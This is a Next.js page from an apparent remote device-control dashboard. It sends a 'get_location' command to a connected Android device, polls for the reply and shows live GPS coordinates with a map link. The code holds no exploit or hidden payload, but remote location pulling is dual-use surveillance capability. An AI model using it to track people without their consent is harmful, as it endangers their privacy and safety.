'use client'
import { Suspense } from 'react'
import { useEffect, useState, useCallback } from 'react'
import { useSearchParams } from 'next/navigation'
import Sidebar from '@/components/Sidebar'
import { MapPin, RefreshCw, Circle, ExternalLink, Navigation } from 'lucide-react'

interface DeviceItem { deviceId: string; deviceName: string; connected: boolean }
interface LocationData { latitude: string; longitude: string; accuracy: string; provider: string; time: string; mapsUrl: string }

function parseLocation(text: string): LocationData | null {
  const lat = text.match(/Latitude:\s*([\d.-]+)/)?.[1]
  const lng = text.match(/Longitude:\s*([\d.-]+)/)?.[1]
  const acc = text.match(/Accuracy:\s*([^\n]+)/)?.[1]
  const prov = text.match(/Provider:\s*([^\n]+)/)?.[1]
  const time = text.match(/Time:\s*([^\n]+)/)?.[1]
  const url = text.match(/Maps:\s*(https?:\/\/[^\n]+)/)?.[1]
  if (!lat || !lng) return null
  return {
    latitude: lat, longitude: lng,
    accuracy: acc?.trim() ?? '--',
    provider: prov?.trim() ?? '--',
    time: time?.trim() ?? '--',
    mapsUrl: url?.trim() ?? `https://maps.google.com/?q=${lat},${lng}`,
  }
}

function LocationContent() {
  const searchParams = useSearchParams()
  const [devices, setDevices] = useState<DeviceItem[]>([])
  const [selectedId, setSelectedId] = useState<string | null>(searchParams.get('d'))
  const [location, setLocation] = useState<LocationData | null>(null)
  const [rawText, setRawText] = useState('')
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')

  const connected = devices.find(d => d.deviceId === selectedId)?.connected ?? false

  const fetchDevices = useCallback(async () => {
    try {
      const res = await fetch('/api/devices')
      const data = await res.json()
      const list: DeviceItem[] = data.devices ?? []
      setDevices(list)
      if (!selectedId && list.length > 0) setSelectedId((list.find(d => d.connected) ?? list[0]).deviceId)
    } catch {}
  }, [selectedId])

  useEffect(() => { fetchDevices(); const iv = setInterval(fetchDevices, 5000); return () => clearInterval(iv) }, [fetchDevices])

  const fetchLocation = async () => {
    if (!selectedId) return
    setLoading(true)
    setLocation(null)
    setRawText('')
    setStatus('Sending command to device…')
    try {
      const sentAt = Date.now()
      await fetch('/api/device/command', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: 'get_location' }),
      })
      setStatus('Waiting for GPS fix…')
      await new Promise(r => setTimeout(r, 3000))
      for (let i = 0; i < 20; i++) {
        const r = await fetch(`/api/device/result?deviceId=${selectedId}`)
        const d = await r.json()
        const match = (d.history ?? [])
          .filter((h: { command: string; result: string; timestamp: string }) =>
            h.command === 'get_location' && new Date(h.timestamp).getTime() > sentAt - 1000
          )
          .sort((a: { timestamp: string }, b: { timestamp: string }) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
          )[0]
        if (match?.result) {
          setRawText(match.result)
          const parsed = parseLocation(match.result)
          setLocation(parsed)
          setStatus('')
          break
        }
        setStatus(`Polling… (${i + 1}/20)`)
        await new Promise(r2 => setTimeout(r2, 2000))
      }
      if (!rawText && !location) setStatus('No response — check GPS is enabled on device')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-2xl mx-auto px-3 md:px-6 py-4 md:py-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2">
                <MapPin size={20} className="text-android-green" /> Location
              </h2>
              <p className="text-android-muted text-xs mt-0.5">Get live GPS coordinates from the device</p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />
              {connected ? 'Online' : 'Offline'}
            </div>
          </div>

          <button onClick={fetchLocation} disabled={!connected || loading}
            className="flex items-center gap-2 px-5 py-2.5 bg-android-green text-android-bg rounded-xl text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed mb-4 w-full justify-center">
            {loading ? <RefreshCw size={15} className="animate-spin" /> : <Navigation size={15} />}
            {loading ? (status || 'Getting location…') : 'Get Location'}
          </button>

          {!connected && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <MapPin size={32} className="mx-auto mb-3 text-android-border" />
              Connect a device to get location
            </div>
          )}

          {connected && !location && !rawText && !loading && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <MapPin size={32} className="mx-auto mb-3 text-android-border" />
              <p>Click "Get Location" to fetch GPS coordinates</p>
              <p className="text-xs mt-2 text-android-muted/60">GPS must be enabled and location permission granted</p>
            </div>
          )}

          {location && (
            <div className="space-y-3">
              <div className="bg-android-surface border border-android-border rounded-xl p-5">
                <div className="grid grid-cols-2 gap-4 mb-5">
                  {[
                    { label: 'Latitude',  value: location.latitude },
                    { label: 'Longitude', value: location.longitude },
                    { label: 'Accuracy',  value: location.accuracy },
                    { label: 'Provider',  value: location.provider },
                    { label: 'Time',      value: location.time, full: true },
                  ].map(({ label, value, full }) => (
                    <div key={label} className={full ? 'col-span-2' : ''}>
                      <p className="text-android-muted text-xs mb-1">{label}</p>
                      <p className="text-android-text font-mono text-sm font-semibold break-all">{value}</p>
                    </div>
                  ))}
                </div>
                <a href={location.mapsUrl} target="_blank" rel="noopener noreferrer"
                  className="flex items-center justify-center gap-2 w-full py-3 bg-android-green text-android-bg rounded-xl font-semibold text-sm hover:bg-android-green/80 transition-colors">
                  <ExternalLink size={16} /> Open in Google Maps
                </a>
              </div>
            </div>
          )}

          {rawText && !location && (
            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <p className="text-android-yellow text-xs mb-2">⚠️ Could not parse location data</p>
              <pre className="text-android-text text-xs whitespace-pre-wrap">{rawText}</pre>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}

export default function LocationPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <LocationContent />
    </Suspense>
  )
}
